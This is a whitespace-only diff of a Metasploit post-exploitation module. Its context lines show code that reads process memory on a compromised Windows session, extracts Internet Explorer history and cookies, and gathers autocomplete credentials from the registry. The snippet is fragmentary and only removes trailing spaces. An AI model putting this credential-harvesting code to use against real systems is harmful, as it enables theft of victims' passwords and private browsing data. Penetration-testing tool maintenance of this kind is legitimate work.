@@ -71,13 +71,13 @@ class Metasploit3 < Msf::Post
 			process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 			raw = process.memory.read(address, len)
 			if type == 0 #unicode
-				str_data = raw.gsub("\x00","") 
+				str_data = raw.gsub("\x00","")
 			elsif type == 1 #null terminated
-				str_data = raw.unpack("Z*")[0] 
-			elsif type == 2 #raw data 
+				str_data = raw.unpack("Z*")[0]
+			elsif type == 2 #raw data
 				str_data = raw
 			end
-		rescue 
+		rescue
 			str_data = nil
 		end
 		return str_data || "Error Decrypting"
@@ -171,7 +171,7 @@ class Metasploit3 < Msf::Post
 
 		urls = tmpout.scan(re)
 		urls.each do |url|
-			#date modified 
+			#date modified
 			hist = {}
 			origh = url[0].unpack('H*')[0]
 			harr = origh.scan(/[0-9A-Fa-f]{2}/).map { |i| i.to_s}
@@ -195,7 +195,7 @@ class Metasploit3 < Msf::Post
 			if history
 				@hist_col << hist
 				@hist_table << [hist["dtmod"],hist["dtacc"],hist["url"]]
-			else 
+			else
 				@cook_table << [hist["dtmod"],hist["dtacc"],hist["url"]]
 			end
 		end
@@ -321,7 +321,7 @@ class Metasploit3 < Msf::Post
 		#get autocomplete creds
 		print_status("Looping through history to find autocomplete data....")
 		val_arr = registry_enumvals(regpath)
-		if val_arr 
+		if val_arr
 			@hist_col.each do |hitem|
 				url = hitem["url"].split('?')[0].downcase
 				hash = hash_url(url).upcase
